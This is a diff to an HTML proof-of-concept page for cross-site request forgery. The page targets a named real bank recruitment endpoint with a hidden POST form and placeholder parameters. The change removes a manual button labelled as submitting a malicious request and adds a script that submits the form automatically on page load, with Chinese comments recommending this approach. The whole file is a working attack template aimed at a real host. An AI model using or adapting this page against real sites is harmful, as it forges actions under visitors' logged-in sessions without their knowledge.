@@ -1,18 +1,25 @@
-  <!doctype html>
-  <html lang="zh-CN">
-  <head>
+<!doctype html>
+<html lang="zh-CN">
+<head>
     <meta charset="utf-8">
-    <title>CSRF PoC Demo</title>
-  </head>
-  <body>
+    <title>CSRF PoC Demo - 自动提交</title>
+</head>
+<body>
+
     <form id="csrfForm" method="POST" action="https://zhaopin.shengjingbank.com.cn:8080/servlet/hirelogin/HireCloseBrowse">
-      <input type="hidden" name="param1" value="value1">
-      <input type="hidden" name="param2" value="value2">
-      <button type="submit" id="submitBtn" >提交恶意请求</button>
+        <input type="hidden" name="param1" value="value1">
+        <input type="hidden" name="param2" value="value2">
     </form>
 
     <script>
-      history.pushState('', '', '/');
+        // 页面加载完成后立即自动提交表单
+        window.onload = function() {
+            document.getElementById("csrfForm").submit();
+        };
+
+        // 或者使用更简洁的方式（推荐）
+        // document.getElementById("csrfForm").submit();
     </script>
-  </body>
-  </html>
+
+</body>
+</html>
